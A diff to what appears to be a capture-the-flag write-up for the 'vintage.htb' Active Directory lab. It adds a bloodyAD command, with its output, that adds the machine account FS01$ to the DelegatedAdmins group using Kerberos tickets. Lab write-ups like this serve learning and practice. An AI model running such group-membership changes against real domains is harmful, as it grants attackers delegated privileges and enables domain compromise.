@@ -412,5 +412,12 @@ SMB         dc01.vintage.htb 445    dc01             [+] Run the following comma
 Now i have all the TGTs i can add `FS01$` to the `DelegatedAdmins` group
 
 ```python
+bloodyAD -k --host dc01.vintage.htb -d vintage.htb add groupMember 'DelegatedAdmins' 'FS01$'
+
+[+] FS01$ added to DelegatedAdmins
+```
+This added the user to the group
+
+```python
 
 ```
